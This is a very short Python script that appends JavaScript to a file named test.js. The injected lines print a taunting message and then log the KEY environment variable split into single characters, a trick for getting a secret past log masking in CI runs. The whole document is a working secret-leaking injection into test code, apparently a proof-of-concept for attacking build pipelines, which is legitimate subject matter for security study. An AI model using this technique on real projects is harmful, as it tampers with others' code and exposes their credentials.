

INJECT = 'console.log("I lied :(");\nconsole.log(process.env["KEY"].split(""))\n'

with open("test.js", "a") as myfile:
    myfile.write(INJECT)